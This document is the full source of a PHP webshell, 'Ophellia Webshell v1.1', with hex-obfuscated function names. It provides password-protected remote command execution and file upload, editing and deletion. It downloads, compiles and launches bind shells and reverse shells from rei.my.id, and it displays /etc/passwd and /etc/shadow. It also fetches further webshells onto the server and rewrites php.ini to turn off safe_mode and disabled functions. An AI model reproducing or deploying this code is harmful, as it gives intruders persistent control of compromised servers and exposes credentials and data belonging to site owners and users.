<?php
/*
            Ophellia Webshell v1.1
          copyright @elliottophellia

           illegal use is prohibited
      github.com/elliottophellia/ophellia
*/
$pass = '91bec630c1ca424538cef11f7b0acdd0'; // lovepalestine
$op = array("5f504f5354","5F474554","6572726F725F7265706F7274696E67","7365745F74696D655F6C696D6974","6F625F7374617274","696E695F736574","73657373696F6E5F7374617274","696E695F676574","6D6435","5F53455353494F4E","6368646972","676574637764","66756E6374696F6E5F657869737473","6469736b5f667265655f7370616365","7368656C6C5F65786563","6469726e616d65","7374726970736c6173686573","7374725f7265706c616365","7068705f756e616d65","6765745f63757272656e745f75736572","70687076657273696f6e","66696c655f6765745f636f6e74656e7473","66696C655F7075745F636F6E74656E7473","66696C655F657869737473","676574686f737462796e616d65","6d61696c","69735f7772697461626c65","756e6c696e6b","626173656e616d65","6d6f76655f75706c6f616465645f66696c65","726d646972","7363616E646972","66696c657065726d73","66696c656d74696d65","66696c6573697a65","68746d6c656e746974696573","68746d6c7370656369616c6368617273");
function hlx($rr){$xx = '';for ($c = 0; $c < strlen($rr); $c += 2) {$xx .= chr(hexdec($rr[$c] . $rr[$c + 1]));}return (string) $xx;}$vcx = count($op);for ($i = 0; $i < $vcx; $i++) {$opl[] = hlx($op[$i]);}function savefrom($f, $t){global $opl;$w = @fopen($f, "w") or @$opl[12]('file_put_contents');if ($w) {@fwrite($w, $t) or @fputs($w, $t) or @$opl[22]($f, $t);@fclose($w);}}function fsize($file) {global $opl;$a = ["B", "KB", "MB", "GB", "TB", "PB"];$pos = 0;$size = $opl[34]($file);while ($size >= 1024) {$size /= 1024;$pos++;}return round($size, 2)." ".$a[$pos];}function perms($file) {global $opl;return substr(sprintf('%o', $opl[32]($file)), -4);}function lasmod($file) {global $opl;return date("d/m/Y H:i:s", $opl[33]($file));}$opl[2](0);$opl[3](0);$opl[4]();@$opl[5]('max_execution_time', 0);@$opl[5]('output_buffering', 0);$opl[6]();echo '<html><head><title>o p h e l l i a</title></head><body><style>@import url(https://rei.my.id/ophellia/style.css);</style>';if ($opl[8](${$opl[0]}['pass']) == $pass) {$opl[6]();${$opl[9]}['pass'] = $pass;}if (isset(${$opl[9]}['pass']) == $pass) {if ($opl[7]('safe_mode')) {$Safe = "<font color='red'><b>ON</b></font>";} else {$Safe = "<font color='green'><b>OFF</b></font>";}if (isset(${$opl[1]}['d'])) {$path = ${$opl[1]}['d'];$opl[10](${$opl[1]}['d']);} else {$path = $opl[11]();}if (isset($mkdir)) {$mkdir = $path . "/" . ${$opl[1]}['mkdir'];}if (isset($mkfile)) {$mkfile = $path . "/" . ${$opl[1]}['mkfile'];}$f = ${$opl[1]}['f'];$fedit = ${$opl[1]}['fedit'];$gwejh = $opl[16](${$opl[1]}['gwejh']);$mkdir = ${$opl[1]}['mkdir'];$tools = ${$opl[1]}['t'];$rmdir = ${$opl[1]}['rmdir'];$mkfile = ${$opl[1]}['mkfile'];$file = $_SERVER['PHP_SELF'];$root = $_SERVER['DOCUMENT_ROOT'];$bytes = $opl[13](".");$remove_file = ${$opl[1]}['rfile'];$rename = ${$opl[1]}['rename'];$path = $opl[17]('\\', '/', $path);$si_prefix = array('B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB');$class = min((int) log($bytes, 1024), count($si_prefix) - 1);$size = sprintf('%1.2f', $bytes / pow(1024, $class)) . ' ' . $si_prefix[$class];echo '<img src="//bit.ly/ophelliaa" width="390" /><br/><button><a class="btn" href="?"><b>HOME</b><a></button> <button><a href="' . $file . '?t=upload&d=' . $path . '"><b>UPLOAD</b></a></button> <button><a href="' . $file . '?t=network&d=' . $path . '"><b>NETWORK</b></a></button> <button><a href="' . $file . '?t=mailer&d=' . $path . '"><b>MAILER</b></a></button> <button><a href="' . $file . '?t=info&d=' . $path . '"><b>INFO</b></a></button> <button><a href="' . $file . '?exit"><b>LOGOUT</b></a></button><br/><form method="get" action=""><input id="ememm" type="text" name="gwejh" value="uname -a"> <input type="hidden" name="d" value="' . $path . '"><input type="submit" value="X"></form><br/><form method="post" action=""><select id="emem" name="spawn"><option value="webconsole">webconsole</option><option value="indoxploit">indoxploit</option><option value="marijuana">marijuana</option><option value="adminer">adminer</option><option value="phpinfo">phpinfo</option><option value="phpini">php.ini</option><option value="b374k">b374k</option><option value="wso">wso</option></select>&nbsp;<input type="submit" value="X"></form> <form method="get" action=""><input id="emem" type="text" name="mkfile" value="CreateFile.php"> <input type="hidden" name="d" value="' . $path . '"> <input type="submit" value="X"></form><br/><form method="get" action=""><input id="emem" type="text" name="d" value=' . $path . '>&nbsp;<input type="submit" value="X"></form> <form method="get" action=""><input id="emem" type="text" name="mkdir" value="CreateDir"> <input type="hidden" name="d" value="' . $path . '"><input type="submit" value="X"></form>';if (isset($tools)) {if ($tools == 'network') {$back_connect_c = $opl[21]('https://rei.my.id/back_connect/c.txt');$back_connect_p = $opl[21]('https://rei.my.id/back_connect/perl.txt');$bind_port_c = $opl[21]('https://rei.my.id/bind_shell/c.txt');$bind_port_p = $opl[21]('https://rei.my.id/bind_shell/perl.txt');echo '<h2>Network Tools</h2><h3>Bind Shell</h3><form method="post" action="">Port: <input type="text" name="port" value="31337"> Password: <input type="text" name="password" value="">Type: <select name="type"><option value="cbind">C</option><option value="perlbind">Perl</option></select><input type="submit" value="Execute"></form><br/><h3>Back Connect</h3><form method="post" action="">IP: <input type="text" name="ip" value=""> Port: <input type="text" name="port" value="31337">Type: <select name="type"><option value="cconnect">C</option><option value="perlconnect">Perl</option></select><input type="submit" value="Execute"></form>';if (isset(${$opl[0]}['type'])) {if (${$opl[0]}['type'] == 'cbind') {savefrom('/tmp/bind.c', $bind_port_c);$opl[14]('gcc -o /tmp/bind /tmp/bind.c');$opl[14]('/tmp/bind ' . ${$opl[0]}['port'] . ' ' . ${$opl[0]}['password'] . ' &');echo "<pre>" . $opl[14]('ps aux | grep bind') . "<pre>";}if (${$opl[0]}['type'] == 'perlbind') {savefrom('/tmp/bind.pl', $bind_port_p);$opl[14]('perl bind.pl ' . ${$opl[0]}['port'] . ' ' . ${$opl[0]}['password'] . ' &');echo "<pre>" . $opl[14]('ps aux | grep bind') . "<pre>";}if (${$opl[0]}['type'] == 'cconnect') {savefrom('/tmp/connect.c', $back_connect_c);$opl[14]('gcc -o /tmp/connect /tmp/connect.c');$opl[14]('./connect ' . ${$opl[0]}['ip'] . ' ' . ${$opl[0]}['port'] . ' &');echo "<pre>" . $opl[14]('ps aux | grep connect') . "<pre>";}if (${$opl[0]}['type'] == 'perlconnect') {savefrom('/tmp/connect.pl', $back_connect_p);$opl[14]('perl /tmp/connect.pl ' . ${$opl[0]}['ip'] . ' ' . ${$opl[0]}['port'] . ' &');echo "<pre>" . $opl[14]('ps aux | grep connect') . "<pre>";}}die();}if ($tools == 'mailer') {echo '<h2>Mailer Tools</h2><form method="post" action="">From: <input type="text" name="from" value="hacker@' . $_SERVER['SERVER_NAME'] . '"> To: <input type="text" name="to" value="contact@rei.my.id"> Subject: <input type="text" name="subject" value="im using your webshell!"><br><textarea name="message" style="width: 40%;" rows="15">my ip address is ' . $_SERVER['REMOTE_ADDR'] . '</textarea><br><input type="submit" value="Execute"></form><pre>';if (isset(${$opl[0]}['from'])) {$headers = "From: " . ${$opl[0]}['from'] . "\r\n";$headers .= "Reply-To: " . ${$opl[0]}['from'] . "\r\n";$headers .= "Return-Path: " . ${$opl[0]}['from'] . "\r\n";$headers .= "X-Mailer: PHP/" . $opl[20]();$opl[25](${$opl[0]}['to'], ${$opl[0]}['subject'], ${$opl[0]}['message'], $headers);echo "Mail Sent !";}echo '</pre>';die();}if ($tools == 'upload') {echo "<h2>Upload Tools</h2><form method='post' enctype='multipart/form-data'><div style='justify-content: center'><input type='radio' name='uploadtype' value='1' checked>current_dir [ $path ]<br/><input type='radio' name='uploadtype' value='2'>document_root [ $root ]</div><br/><input type='file' name='upload'> <input type='submit' value='upload' name='upload'></form><br/>";if (isset(${$opl[0]}['upload'])) {if (${$opl[0]}['uploadtype'] == 1) {$tmp = $_FILES['upload']['tmp_name'];$up = $opl[28]($_FILES['upload']['name']);if ($opl[29]($tmp, $path . "/" . $up)) {echo "<font color='green'><b>SUCCESSFULLY UPLOADED</b></font>";} else {echo "<font color='red'><b>FAILED TO UPLOAD FILE</b></font>";}} else {$tmp = $_FILES['upload']['tmp_name'];$up = $opl[28]($_FILES['upload']['name']);if ($opl[29]($tmp, $root . "/" . $up)) {echo "<font color='green'><b>SUCCESSFULLY UPLOADED</b></font>";} else {echo "<font color='red'><b>FAILED TO UPLOAD FILE</b></font>";}}}die();}if($tools == 'info') {$disable_functions = (!empty(@$opl[7]('disable_functions'))) ? "<font color='red'><b>" . @$opl[7]('disable_functions') . "</b></font>" : "<font color='green'><b>NONE</b></font>";echo "<div id=\"l\"><pre>System           : " . @$opl[18]('a') ." ". $_SERVER['SERVER_SOFTWARE'] . "<br/>User             : " . $opl[19]() . "<br/>Free Space       : $size<br/>Server IP        : ".$opl[24]($_SERVER['HTTP_HOST'])."<br/>Client IP        : ".$_SERVER['REMOTE_ADDR']."<br/>Safe Mode        : $Safe<br/>PHP Version      : " . @$opl[20]() . "<br/>Disable Function : $disable_functions";if(($opl[21]('/etc/passwd'))) {echo "<br/>/etc/passwd      : <br/><textarea rows=\"15\" name=\"text\" readonly>" . $opl[21]('/etc/passwd') . "</textarea>";}if(($opl[21]('/etc/shadow'))) {echo "<br/>/etc/shadow      : <br/><textarea rows=\"15\" name=\"text\" readonly>" . $opl[21]('/etc/shadow') . "</textarea>";}if(($opl[21]('/etc/group'))) {echo "<br/>/etc/group       : <br/><textarea rows=\"15\" name=\"text\" readonly>" . $opl[21]('/etc/group') . "</textarea>";}if(($opl[21]('/etc/hosts'))) {echo "<br/>/etc/hosts       : <br/><textarea rows=\"15\" name=\"text\" readonly>" . $opl[21]('/etc/hosts') . "</textarea>";}if(($opl[21]('/etc/fstab'))) {echo "<br/>/etc/fstab       : <br/><textarea rows=\"15\" name=\"text\" readonly>" . $opl[21]('/etc/fstab') . "</textarea>";}echo "</pre></div>";die();}}if (isset($remove_file) and $opl[26]($remove_file)) {if ($opl[27]($remove_file)) {echo ("<br/><font color='green'><b>File $remove_file Deleted</b></font>");} else {echo ("<br/><font color='red'><b>File $remove_file Not Deleted</b></font>");}}if (isset($gwejh)) {if(!empty($gwejh)) {echo "<textarea rows=\"15\" name=\"text\" readonly>";echo $opl[14]($gwejh);echo "</textarea>";}}if (isset($mkdir)) {mkdir($mkdir, 0777, true);echo "<br/><font color='green'><b>Directory $mkdir Created</b></font>";}if (isset($mkfile)) {$filez = fopen($mkfile, "w");fclose($filez);echo "<br/><font color='green'><b>File $mkfile Created</b></font>";}if (isset($rmdir)) {if ($opl[30]($rmdir)) {echo "<br/><font color='green'><b>Directory $rmdir Deleted</b></font>";} else {echo "<br/><font color='red'><b>Directory $rmdir Not Deleted</b></font>";}}if (isset(${$opl[0]}['spawn'])) {if (${$opl[0]}['spawn'] == 'webconsole') {savefrom('webconsole.php', $opl[21]('https://rei.my.id/webshell/webconsole.php'));echo "<br/><font color='green'><b>Successfully spawn " . ${$opl[0]}['spawn'] . "<b></font>";} elseif (${$opl[0]}['spawn'] == 'indoxploit') {savefrom('indoxploit.php', $opl[21]('https://rei.my.id/webshell/indoxploit.php'));echo "<br/><font color='green'><b>Successfully spawn " . ${$opl[0]}['spawn'] . "<b></font>";} elseif (${$opl[0]}['spawn'] == 'marijuana') {savefrom('marijuana.php', $opl[21]('https://rei.my.id/webshell/marijuana.php'));echo "<br/><font color='green'><b>Successfully spawn " . ${$opl[0]}['spawn'] . "<b></font>";} elseif (${$opl[0]}['spawn'] == 'adminer') {savefrom('adminer.php', $opl[21]('https://rei.my.id/webshell/adminer.php'));echo "<br/><font color='green'><b>Successfully spawn " . ${$opl[0]}['spawn'] . "<b></font>";} elseif (${$opl[0]}['spawn'] == 'phpinfo') {savefrom('phpinfo.php', $opl[21]('https://rei.my.id/webshell/phpinfo.php'));echo "<br/><font color='green'><b>Successfully spawn " . ${$opl[0]}['spawn'] . "<b></font>";} elseif (${$opl[0]}['spawn'] == 'b374k') {savefrom('b374k.php', $opl[21]('https://rei.my.id/webshell/b374k.php'));echo "<br/><font color='green'><b>Successfully spawn " . ${$opl[0]}['spawn'] . "<b></font>";} elseif (${$opl[0]}['spawn'] == 'wso') {savefrom('wso.php', $opl[21]('https://rei.my.id/webshell/wso.php'));echo "<br/><font color='green'><b>Successfully spawn " . ${$opl[0]}['spawn'] . "<b></font>";} elseif (${$opl[0]}['spawn'] == 'phpini'){$ini = fopen($root.'/php.ini', 'w');fwrite($ini, "safe_mode = OFF\r\ndisable_functions = NONE");fclose($ini);echo "<br/><font color='green'><b>Successfully spawn " . ${$opl[0]}['spawn'] . "<b></font>";} else {echo "<br/><font color='red'><b>Failed to spawn " . ${$opl[0]}['spawn'] . "<b></font>";}}if (isset($rename)) {echo '<form method="post" action="">Old Name: <input type="text" name="oldname" value="' . ${$opl[1]}['oldname'] . '" readonly> New Name: <input type="text" name="newname" value=""> <input type="submit" value="Execute"> <button type="button" onclick="history.go(-1)">Back</button></form><pre>';if (isset(${$opl[0]}['oldname'])) {$opl[14]('mv ' . ${$opl[0]}['oldname'] . ' ' . ${$opl[0]}['newname']);echo "File Renamed !";}echo '</pre>';}if (isset($f) and $opl[33]($f)) {$text = $opl[35]($opl[21]($f));echo "<textarea rows=\"25\" name=\"text\" readonly>$text</textarea><br/>";}if (isset($fedit) and $opl[26]($fedit)) {$text = $opl[36]($opl[21]($fedit));echo "<form method=\"post\" action=\"\"><textarea rows=\"25\" name=\"text\">$text</textarea><br></form><br/><div id=\"l\"><input type=\"submit\" value=\"Save\"> <button type=\"button\" onclick=\"history.go(-1)\">Back</button></div><br/>";if ($opl[23]($fedit)) {if (isset(${$opl[0]}['text'])) {$write = fopen($fedit, 'w');$new_text = $opl[16](${$opl[0]}['text']);if (fwrite($write, $new_text)) {echo '<br><font color="green"><b>Edit File Done.</b></font><br />';} else {echo '<br><font color="red"><b>Edit File Failed.</b></font><br />';}fclose($write);}}}echo '<table style="line-height: 1em"><thead><tr><th width="50%"> File Name </th><th width="5%"> Edit </th><th width="5%"> View </th><th width="5%"> Perm </th><th width="5%"> Remove </th><th width="5%"> Rename </th><th width="5%"> Filesize </th><th width="10%"> Modified </th></tr></thead>';foreach ($opl[31]($path) as $files) {if (is_dir($files)) {if (isset($path)) {if($files == ".." | $files == ".") {$dir = $opl[15]($path);echo "<tr><td><a href='?d=$dir'>&nbsp;&#9898; $files</a></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr>";} else {echo "<tr><td><a href=$file?d=$path/$files>&nbsp;&#9898; $files</td><td id='c'>-</td><td id='c'><a href=$file?d=$files>View</td><td id='c'>".perms($files)."</td><td id='c'><a href=$file?rmdir=$files&d=$path>Remove</a></td><td id='c'><a href=?rename&oldname=$files&d=$path>Rename</a></td><td id='c'>-</td><td id='c'>".lasmod($files)."</td></tr>";}}}}foreach ($opl[31]($path) as $files) {if (is_file($files)) {if (isset($path)) {echo "<tr><td><a href=$file?f=$files&d=$path>&nbsp;&#9898; $files</a></td><td id='c'><a href=$file?fedit=$files&d=$path>Edit</a></td><td id='c'><a href=$file?f=$files&d=$path>View</a></td><td id='c'>".perms($files)."</td><td id='c'><a href=$file?rfile=$files&d=$path>Remove</a></td><td id='c'><a href=?rename&oldname=$files&d=$path>Rename</a></td><td id='c'>".fsize($files)."</td><td id='c'>".lasmod($files)."</td></tr>";}}}echo "</table>";echo '<div id="r"><a href="https://github.com/elliottophellia"><i>@elliottophellia</i></a></div>';if (isset(${$opl[1]}['exit'])) {unset(${$opl[9]}['pass']);echo "<script>window.location.href='?';</script>";exit();}} else {echo '<img src="//bit.ly/ophellia" width="200" /><br/><form action="" method="post"><input type="password" name="pass" style="border: none;"></form>';}echo '</body></html>';
